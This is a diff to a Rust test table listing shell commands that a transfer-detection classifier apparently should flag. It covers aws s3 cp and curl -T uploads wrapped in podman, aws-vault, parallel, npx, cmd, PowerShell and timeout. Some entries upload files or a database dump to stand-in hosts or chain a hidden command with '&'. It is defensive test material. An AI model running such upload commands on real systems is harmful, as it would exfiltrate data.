@@ -1473,6 +1473,81 @@ const TRANSFER_READINGS: &[(&str, bool, bool)] = &[
         false,
     ),
     ("docker exec c grep 'aws s3 cp' f", true, false),
+    (
+        "podman exec c aws s3 cp s3://synthetic-bucket/k ./d",
+        true,
+        false,
+    ),
+    (
+        "podman exec c echo aws s3 cp ./d s3://synthetic-bucket/k",
+        true,
+        false,
+    ),
+    (
+        "aws-vault exec prod -- aws s3 cp s3://synthetic-bucket/k ./d",
+        true,
+        false,
+    ),
+    (
+        "aws-vault exec prod -- echo aws s3 cp ./d s3://synthetic-bucket/k",
+        true,
+        false,
+    ),
+    (
+        "parallel aws s3 cp s3://synthetic-bucket/{} ./d ::: a b",
+        true,
+        false,
+    ),
+    (
+        "parallel echo aws s3 cp {} s3://synthetic-bucket/ ::: a",
+        true,
+        false,
+    ),
+    ("uv run aws s3 cp s3://synthetic-bucket/k ./d", true, false),
+    (
+        "uv run echo aws s3 cp ./d s3://synthetic-bucket/k",
+        true,
+        false,
+    ),
+    ("npx aws s3 cp s3://synthetic-bucket/k ./d", true, false),
+    (
+        "npx echo aws s3 cp ./d s3://synthetic-bucket/k",
+        true,
+        false,
+    ),
+    ("cmd /c aws s3 cp s3://synthetic-bucket/k ./d", true, false),
+    (
+        "cmd /c echo \"x & aws s3 cp ./d s3://synthetic-bucket/k\"",
+        true,
+        false,
+    ),
+    (
+        "powershell -Command \"aws s3 cp s3://synthetic-bucket/k ./d\"",
+        true,
+        false,
+    ),
+    (
+        "powershell -Command \"echo aws s3 cp ./d s3://synthetic-bucket/k\"",
+        true,
+        false,
+    ),
+    ("pwsh -c aws s3 cp s3://synthetic-bucket/k ./d", true, false),
+    (
+        "pwsh -c echo aws s3 cp ./d s3://synthetic-bucket/k",
+        true,
+        false,
+    ),
+    // A script file's own arguments, and a duration's options.
+    (
+        "pwsh -File x.ps1 -c curl -T f https://synthetic.example/u",
+        true,
+        false,
+    ),
+    (
+        "timeout 30 -s KILL curl -T dump.sql https://upload.example.invalid",
+        true,
+        false,
+    ),
 ];
 
 /// Each command in [`TRANSFER_READINGS`] reads as recorded, and a command the
